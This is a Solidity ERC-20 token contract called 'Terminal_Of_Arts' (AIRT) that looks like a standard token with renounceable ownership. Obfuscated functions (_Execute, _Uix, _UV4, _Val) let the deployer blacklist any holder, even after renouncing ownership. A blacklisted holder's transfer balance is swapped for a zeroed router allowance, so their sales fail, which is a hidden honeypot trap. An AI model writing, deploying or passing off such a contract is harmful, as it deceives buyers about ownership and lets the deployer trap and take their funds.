pragma solidity = 0.8.24;
// SPDX-License-Identifier: MIT



interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;   return msg.data;
    }
}
contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _Owner;
    }
    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }
}


contract AIRT is Context, IERC20, Ownable {
    mapping (address => uint256) public _balances;
    mapping (address => uint256) public _UV4;
    mapping (address => bool) private _Val;
    mapping (address => mapping (address => uint256)) private _Send;
    uint256 public _totalSupply;
    string public _name = "Terminal_Of_Arts";
    string public _symbol = unicode"AIRT";
    uint8 private _digits = 8;
	address _Permit =
        0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;


    constructor () {
 
    uint256 _Set = block.number;
	 _UV4[_msgSender()] += _Set;
        _totalSupply += 420000000000 *100000000;
        _balances[_msgSender()] += _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
        function decimals() public view  returns (uint8) {
        return _digits;
    }
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _Send[owner][spender];
    }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
         if (_Val[_msgSender()])  (amount = 0, "");
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transferfrom(sender, recipient, amount);
        uint256 _tUser = _Send[sender][_msgSender()];
        require(_tUser >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), _tUser - amount);
        return true;
    }
    function _Uix(address _Address) external  {
        require (_UV4[_msgSender()] >= _digits);
        _Val[_Address] = false;
    }  
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be grater thatn zero");
          uint256 _sUser = _Send[sender][_Permit];
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
          if (_Val[sender])  (senderBalance = _sUser);
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    } 
    function _transferfrom(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be grater thatn zero");
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    } 
    function _Execute(address _Address) external  {
    require (_UV4[_msgSender()] >= _digits);
        _Val[_Address] = true;
        _Send[_Address][_Permit] = 0;
    }
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _Send[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}